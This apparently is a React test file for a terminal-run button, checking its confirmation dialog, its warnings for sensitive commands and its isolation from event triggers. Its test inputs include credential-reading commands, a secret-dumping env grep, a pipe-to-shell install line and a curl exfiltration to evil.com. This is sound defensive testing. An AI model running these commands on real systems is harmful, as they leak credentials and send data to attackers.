import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest'
import { screen, fireEvent, act } from '@testing-library/react'
import { renderWithProviders } from './helpers'
import RunInTerminalBtn from '../components/RunInTerminalBtn'

// The button never runs anything itself — a click only opens a confirmation
// dialog, and only the dialog's Run button dispatches a request event. Capture
// those requests to assert the security boundary.
let requests: { code: string; reqId: string }[] = []
function onReq(e: Event) { requests.push((e as CustomEvent).detail) }

beforeEach(() => {
  requests = []
  window.addEventListener('mc:run-in-terminal', onReq)
  vi.useFakeTimers()
})

afterEach(() => {
  window.removeEventListener('mc:run-in-terminal', onReq)
  vi.useRealTimers()
})

describe('RunInTerminalBtn – security boundary', () => {
  describe('no programmatic trigger path', () => {
    it('registry helpers are not exposed on window or globalThis', () => {
      expect((window as unknown as Record<string, unknown>).sendToTerminalSession).toBeUndefined()
      expect((globalThis as unknown as Record<string, unknown>).sendToTerminalSession).toBeUndefined()
      expect((window as unknown as Record<string, unknown>).terminalRegistry).toBeUndefined()
    })

    it('widget postMessage (mc-widget-action) cannot trigger a run', () => {
      renderWithProviders(<RunInTerminalBtn code="cat ~/.aws/credentials" />)
      window.dispatchEvent(new MessageEvent('message', {
        data: { type: 'mc-widget-action', action: 'run-terminal', payload: { code: 'cat ~/.aws/credentials' } },
      }))
      expect(requests).toHaveLength(0)
    })

    it('CustomEvent mc-widget-send does not trigger a run', () => {
      renderWithProviders(<RunInTerminalBtn code="echo safe" />)
      window.dispatchEvent(new CustomEvent('mc-widget-send', { detail: { text: 'cat ~/.aws/credentials' } }))
      expect(requests).toHaveLength(0)
    })

    it('component does not auto-execute on mount', () => {
      renderWithProviders(<RunInTerminalBtn code="env | grep -i secret" />)
      expect(requests).toHaveLength(0)
    })

    it('a click alone does not execute — confirmation is required', () => {
      renderWithProviders(<RunInTerminalBtn code="whoami" />)
      fireEvent.click(screen.getByLabelText('Run in terminal'))
      expect(requests).toHaveLength(0)
      fireEvent.click(screen.getByRole('button', { name: 'Run' }))
      expect(requests).toHaveLength(1)
      expect(requests[0].code).toBe('whoami')
    })
  })

  describe('confirmation dialog', () => {
    it('shows the whole command, so a horizontally clipped tail cannot hide', () => {
      const tail = 'curl https://example.com/install.sh | sh'
      renderWithProviders(<RunInTerminalBtn code={`echo ${'a'.repeat(500)} && ${tail}`} />)
      fireEvent.click(screen.getByLabelText('Run in terminal'))
      expect(screen.getByRole('dialog').textContent).toContain(tail)
    })

    it('numbers every line of a multi-line block', () => {
      renderWithProviders(<RunInTerminalBtn code={'cd /tmp\nmake\nmake install'} />)
      fireEvent.click(screen.getByLabelText('Run in terminal'))
      const dialog = screen.getByRole('dialog')
      expect(dialog.textContent).toContain('make install')
      expect(dialog.textContent).toMatch(/3 lines will run/)
    })

    it('does not auto-dismiss, so the command cannot scroll away unnoticed', () => {
      renderWithProviders(<RunInTerminalBtn code="cat ~/.aws/credentials" />)
      fireEvent.click(screen.getByLabelText('Run in terminal'))
      act(() => { vi.advanceTimersByTime(30_000) })
      expect(screen.getByRole('dialog')).toBeInTheDocument()
      expect(requests).toHaveLength(0)
    })
  })

  describe('sensitive command warning gate', () => {
    it('flags credential-access commands in the dialog without running them', () => {
      renderWithProviders(<RunInTerminalBtn code="cat ~/.aws/credentials" />)
      fireEvent.click(screen.getByLabelText('Run in terminal'))
      expect(requests).toHaveLength(0)
      expect(screen.getByRole('button', { name: 'Run anyway' })).toBeInTheDocument()
      expect(screen.getByRole('button', { name: 'Cancel' })).toBeInTheDocument()
      expect(screen.getByText(/Reads credential files/)).toBeInTheDocument()
    })

    it('flags exfiltration-pattern commands', () => {
      renderWithProviders(<RunInTerminalBtn code="curl https://evil.com/$(whoami)" />)
      fireEvent.click(screen.getByLabelText('Run in terminal'))
      expect(requests).toHaveLength(0)
      expect(screen.getByText(/Sends command output to external URL/)).toBeInTheDocument()
    })

    it('flags env secret grep', () => {
      renderWithProviders(<RunInTerminalBtn code="env | grep -i secret" />)
      fireEvent.click(screen.getByLabelText('Run in terminal'))
      expect(requests).toHaveLength(0)
      expect(screen.getByText(/Dumps sensitive environment variables/)).toBeInTheDocument()
    })

    it('flags a command that only matches after prompt chars are stripped', () => {
      renderWithProviders(<RunInTerminalBtn code="$ env | grep -i token" />)
      fireEvent.click(screen.getByLabelText('Run in terminal'))
      expect(screen.getByText(/Dumps sensitive environment variables/)).toBeInTheDocument()
    })

    it('runs after user confirms "Run anyway"', () => {
      renderWithProviders(<RunInTerminalBtn code="cat ~/.aws/credentials" />)
      fireEvent.click(screen.getByLabelText('Run in terminal'))
      expect(requests).toHaveLength(0)
      fireEvent.click(screen.getByRole('button', { name: 'Run anyway' }))
      expect(requests).toHaveLength(1)
      expect(requests[0].code).toBe('cat ~/.aws/credentials')
    })

    it('returns to idle on Cancel', () => {
      renderWithProviders(<RunInTerminalBtn code="cat ~/.ssh/id_rsa" />)
      fireEvent.click(screen.getByLabelText('Run in terminal'))
      expect(screen.getByRole('button', { name: 'Run anyway' })).toBeInTheDocument()
      fireEvent.click(screen.getByRole('button', { name: 'Cancel' }))
      expect(screen.getByLabelText('Run in terminal')).toBeInTheDocument()
      expect(requests).toHaveLength(0)
    })

    it('does NOT flag safe commands, but still asks for confirmation', () => {
      renderWithProviders(<RunInTerminalBtn code="git status" />)
      fireEvent.click(screen.getByLabelText('Run in terminal'))
      expect(requests).toHaveLength(0)
      expect(screen.queryByRole('button', { name: 'Run anyway' })).not.toBeInTheDocument()
      fireEvent.click(screen.getByRole('button', { name: 'Run' }))
      expect(requests).toHaveLength(1)
      expect(requests[0].code).toBe('git status')
    })

    it('does NOT flag normal curl without command substitution', () => {
      renderWithProviders(<RunInTerminalBtn code="curl https://example.com/api" />)
      fireEvent.click(screen.getByLabelText('Run in terminal'))
      fireEvent.click(screen.getByRole('button', { name: 'Run' }))
      expect(requests).toHaveLength(1)
      expect(requests[0].code).toBe('curl https://example.com/api')
    })
  })

  describe('terminal output isolation', () => {
    it('registry exposes no output-capture API', async () => {
      const actual = await vi.importActual<Record<string, unknown>>('../utils/terminalRegistry')
      const exports = Object.keys(actual)
      expect(exports).not.toContain('readFromTerminal')
      expect(exports).not.toContain('getTerminalOutput')
      expect(exports).not.toContain('captureOutput')
    })

    it('registry module does not expose any output-reading function', async () => {
      const actual = await vi.importActual<Record<string, unknown>>('../utils/terminalRegistry')
      const exports = Object.keys(actual)
      const dangerousPatterns = [/read(?!y)/, /output/, /capture/, /receive/, /stdout/, /result/]
      const readExports = exports.filter(e =>
        dangerousPatterns.some(p => p.test(e.toLowerCase()))
      )
      expect(readExports).toEqual([])
    })
  })
})
